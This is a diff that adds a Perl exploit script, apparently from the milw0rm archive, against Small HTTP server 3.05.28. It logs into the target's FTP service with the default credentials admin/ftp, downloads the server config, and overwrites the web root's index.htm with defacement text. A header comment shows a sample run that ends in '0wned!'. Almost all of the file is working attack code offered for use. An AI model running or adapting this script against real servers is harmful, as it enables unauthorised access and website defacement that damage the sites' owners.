@@ -1,0 +1,142 @@
+#!/usr/bin/perl
+#
+#  sHTTP FTPServer Abritary Data Execution Exploit
+# --------------------------------------------------
+#      Infam0us Gr0up - Securiti Research
+# 
+#
+# E:\PERL>perl shttp.pl localhost C:\shttps
+# 
+# [?] Version: libwww-perl-5.76
+# [+] Connect to localhost...
+# [+] Connected
+# [+] Send user and pass..
+# [+] Logged in!
+# [+] Directory List:
+# 
+# . | 0
+# .. | 0
+# uninst.exe | 3072
+# http.exe | 78848
+# desc.htm | 42788
+# license.txt | 1804
+# http.cfg | 1616
+# www | 0
+# 1.txt | 41
+# 
+# [+] Getting FTP config..[OK]
+# [+] Backup target file..[OK]
+# [+] Set homepage defacement..[DONE]
+# [*] 0wned!
+# 
+# Tested on Windows2000 SP4 (Win NT)
+# info: infamous.2hell.com
+#
+
+use LWP;
+
+$subject = "sHTTP FTPServer Abritary Data Execution Exploit";
+$vers = "Small HTTP server  3.05.28";
+$vendor = "http://srv.mf.inc.ru";
+$codz = "basher13 - basher13(at)linuxmail.org";
+
+if(@ARGV!=2){
+    print "\n";
+    print " $subject\n";
+    print "-------------------------------------------------\n\n";
+    print "Usage: $0 [remote IP] [dir_path] \n";
+    print "Exam: $0 127.0.0.1 c:\\shttps \n\n";
+    exit;
+}
+
+use Net::FTP;
+use IO::Dir;  
+use Tk;
+
+$target = $ARGV[0];
+$path = $ARGV[1];
+
+
+# Modify $text to changes the default homepage
+$text = "[title]PENETRATION TEST[/title]Subject: $subject[br]Version: $vers[br]URL: $vendor[br]Coders: $codz";
+
+my $user = "admin"; # Changes USER to own feed
+my $pass = "ftp"; # Changes PASS to own feed
+
+$cols=1000000;
+
+print "\n";
+print "-------------------------------------------------------\n";
+print "[?] Version: libwww-perl-$LWP::VERSION\n";
+sleep(2);
+print "[+] Connect to $target...\n"; 
+$ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not 
+connect: $!";
+
+print "[+] Connected\n";
+print "[+] Send user and pass..\n";
+$ftp->login($user, $pass) || die "could not login: $!"; 
+sleep(1);
+
+print "[+] Logged in!\n";
+print "[+] Directory List: \n\n";
+sleep(2);
+
+tie %dir, IO::Dir, $path;
+foreach (keys %dir) {
+print  $_, " | " , $dir{$_}->size,"\n";
+}
+
+print "\n";
+print "[+] Getting FTP config..";
+sleep(1);
+
+$ftp->get("http.cfg")
+      or die "Get failed ", $ftp->message;  
+
+print "[OK]\n";
+print "[+] Backup target file..";
+sleep(2);
+
+$dirpath = "$path\\www\\index.htm";
+
+$lama = $dirpath;
+$baru = "$dirpath.BAK.$$(basher13)";
+
+ open(OLD, "< $lama")         or die "FAILED to open $lama\n[-] Reason: Try on another place..\n";
+ open(NEW, "> $baru")         or die "can't open $baru: $!\n";
+
+ while () {
+        s/\b(p)earl\b/${1}erl/i;
+        (print NEW $_)       or die "FAILED to write to $baru\n[-] Reason: Server has secure permission\n";
+    }
+ close(OLD)                  or die "FAILED to close $lama\n";
+ close(NEW)                  or die "can't close $baru\n";
+
+print "[OK]\n";
+print "[+] Set homepage defacement..";
+sleep(2);
+
+open(OUT, ">$dirpath") or die("unable to open $dirpath: $!");
+open FH, ">$dirpath";
+print FH "$text";
+print "[DONE]\n";
+close FH;
+    
+print "[*] 0wned!\n";
+$ftp->quit;  
+print "-------------------------------------------------------\n";
+my $mw = MainWindow->new(-title => 'INFO',);
+    my $var;
+
+    my $opt = $mw->Optionmenu(
+                
+                -options => [qw()],
+                -command => sub { print "\n[>]: ", shift, "\n" },
+                -variable => \$var,
+                )->pack;
+    $opt->addOptions([- Subject=>$subject],[- Version=>$vers],[- Vendor=>$vendor],[- Coder=>$codz]);   
+    $mw->Button(-text=>'CLOSE', -command=>sub{$mw->destroy})->pack;
+    MainLoop;
+
+# milw0rm.com [2005-07-15]
